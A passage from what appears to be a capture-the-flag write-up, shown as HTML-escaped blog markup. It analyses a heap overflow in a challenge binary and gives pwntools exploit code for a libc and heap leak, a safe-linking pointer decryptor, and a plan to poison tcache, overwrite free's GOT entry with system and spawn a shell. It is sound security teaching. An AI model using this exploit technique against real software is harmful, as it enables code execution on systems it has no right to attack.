    __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;age);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input bio: (max %d)&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32LL&lt;/span&gt;);
    read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bio, size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32LL&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Successfully edit&amp;#39;d!&amp;#34;&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It reads &lt;code&gt;size_array[2 * idx] - 32LL&lt;/code&gt; bytes into a &lt;code&gt;0x100&lt;/code&gt;-sized buffer which leads to a heap overflow.&lt;/p&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;There is no actual issue, we can allocate whatever chunk bigger than &lt;code&gt;0x407&lt;/code&gt;, the only fancy thing we have to do would be to defeat safe-linking to get an arbitrary write with a tcache poisoning attack on the &lt;code&gt;0x410&lt;/code&gt; tcache bin. Here is the attack I led against the challenge but that&amp;rsquo;s not the most optimized.&lt;/p&gt;
&lt;p&gt;The plan is to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Allocate two &lt;code&gt;0x408&lt;/code&gt;-sized chunks : pivot and victim, in order to easily get later libc leak.&lt;/li&gt;
&lt;li&gt;Allocate 9 more chunks and then fill the &lt;code&gt;0x410&lt;/code&gt; tcachebin with them (with only 7 of them).&lt;/li&gt;
&lt;li&gt;Delete &lt;code&gt;victim&lt;/code&gt; and overflow pivot up to the next free pointer of &lt;code&gt;victim&lt;/code&gt; to get a libc leak.&lt;/li&gt;
&lt;li&gt;Allocate a &lt;code&gt;0x408&lt;/code&gt;-sized chunk to get the &lt;code&gt;8&lt;/code&gt;-th chunk (within &lt;code&gt;chunk_array&lt;/code&gt;) which is on the top of the bin.&lt;/li&gt;
&lt;li&gt;Leak the heap same way as for libc, but we have to defeat safe-linking.&lt;/li&gt;
&lt;li&gt;Delete the &lt;code&gt;9&lt;/code&gt;-th chunk to put it in the tcachebin at the first position.&lt;/li&gt;
&lt;li&gt;Then we can simply &lt;code&gt;edit&lt;/code&gt; chunk &lt;code&gt;8&lt;/code&gt; and overflow over chunk &lt;code&gt;9&lt;/code&gt; to poison its next &lt;code&gt;fp&lt;/code&gt; to hiijack it toward the GOT entry of &lt;code&gt;free&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Pop chunk &lt;code&gt;9&lt;/code&gt; from the freelist and then request another the target memory area : the GOT entry of &lt;code&gt;free&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Write &lt;code&gt;system&lt;/code&gt; into the GOT entry of &lt;code&gt;free&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Free whatever chunk for which &lt;code&gt;//bin/sh&lt;/code&gt; is written at the right begin.&lt;/li&gt;
&lt;li&gt;PROFIT.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To understand the attack process I&amp;rsquo;ll show the heap state at certain part of the attack.&lt;/p&gt;
&lt;h2 id=&#34;libc--heap-leak&#34;&gt;Libc / heap leak&lt;/h2&gt;
&lt;p&gt;First we have to fill the tcache. We allocate a chunk right after &lt;code&gt;chunk0&lt;/code&gt; we do not put into the tcache to be able to put it in the unsortedbin to make appear unsortedbin&amp;rsquo;s address:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;//bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# pivot&lt;/span&gt;
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# victim&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
    add(i, &lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
    delete(i)

delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Y&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;))

show(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Y&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1 Add&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1c7cc0&lt;/span&gt;
pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# Heap state:&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1290	0x0000000000000000	0x0000000000000411	................ [chunk0]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de12a0	0x68732f6e69622f0a	0x0000000000000a0a	./bin/sh........
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de12b0	0x000000000000000a	0x0000000000000539	........9.......
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de12c0	0x0000000000000000	0x0000000000000000	................
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de12d0	0x0000000000000000	0x0000000000000000	................
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de12e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de12f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1300	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1310	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1320	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1330	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1340	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1350	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1360	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1370	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1380	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1390	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de13a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de13b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de13c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de13d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de13e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de13f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1400	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1410	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1420	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1430	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1440	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1450	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1460	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1470	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1480	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1490	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de14a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de14b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de14c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de14d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de14e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de14f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1500	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1510	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1520	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1530	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1540	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1550	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1560	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1570	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1580	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1590	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de15a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de15b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de15c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de15d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de15e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de15f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1600	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1610	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1620	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1630	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1640	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1650	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1660	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1670	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1680	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de1690	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de16a0	0x5959595959595959	0x0a59595959595959	YYYYYYYYYYYYYYY.	 &amp;lt;-- unsortedbin[all][0] [chunk1]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x1de16b0	0x00007f34f64c3cc0	0x00007f34f64c3cc0	.&amp;lt;L.4....&amp;lt;L.4...
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then let&amp;rsquo;s get a heap leak, we request back from the tcache the 8-th chunk, we free the &lt;code&gt;9&lt;/code&gt;-th chunk that is allocated right after the &lt;code&gt;8&lt;/code&gt;-th to be able to leak its next free pointer same way as for the libc previously. Plus we have to defeat safe-linking. To understand the defeat of safe-linking I advice you to read &lt;a href=&#34;https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation&#34;&gt;this&lt;/a&gt;. It ends up to the &lt;code&gt;decrypt_pointer&lt;/code&gt; function that makes use of known parts of the encrypted &lt;code&gt;fp&lt;/code&gt; to decrypt the whole pointer. I didn&amp;rsquo;t code the function by myself, too lazy for that, code comes from the &lt;a href=&#34;https://github.com/AeroCTF/aero-ctf-2022/blob/main/tasks/pwn/heap-2022/solution/sploit.py#L44&#34;&gt;AeroCTF heap-2022 writeup&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt_pointer&lt;/span&gt;(leak: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
    parts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

    parts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append((leak &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;)
    parts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append((((leak &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;)
    parts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append((((leak &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFF&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFF&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; parts[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]

